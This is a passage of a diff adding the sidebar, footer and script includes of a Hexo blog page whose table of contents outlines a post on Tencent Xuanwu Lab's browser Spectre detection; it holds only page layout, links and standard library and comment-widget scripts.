+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一步"><span class="nav-number">1.</span> <span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二步"><span class="nav-number">2.</span> <span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第三步"><span class="nav-number">3.</span> <span class="nav-text">第三步</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#readMemoryByte"><span class="nav-number">4.</span> <span class="nav-text">readMemoryByte</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防护建议"><span class="nav-number">5.</span> <span class="nav-text">防护建议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#references"><span class="nav-number">6.</span> <span class="nav-text">references</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/';
+          this.page.identifier = '2018/01/09/腾讯玄武实验室检测浏览器spectre的原理/';
+          this.page.title = '腾讯玄武实验室检测浏览器spectre的原理';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
